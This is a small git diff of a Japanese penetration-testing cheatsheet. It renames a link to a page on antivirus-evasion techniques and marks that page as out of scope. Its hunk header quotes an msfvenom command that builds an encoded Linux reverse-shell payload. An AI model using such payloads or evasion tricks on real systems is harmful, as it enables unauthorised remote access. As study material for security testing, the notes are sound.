@@ -60,7 +60,7 @@ sudo msfvenom -p linux/x86/shell/reverse_tcp -f c -e x86/shikata_ga_nai -o shell
 
 # ペイロードについて
 
-- [AV Evasionのテクニック](../Cheatsheet/AV%20Evasion/AV%20Evasionのテクニック.md)
+- [AV Evasionのテクニック](../Cheatsheet/AV%20Evasion(範囲外)/AV%20Evasionのテクニック.md)
 
 ペイロードの命名規則
 ```zsh
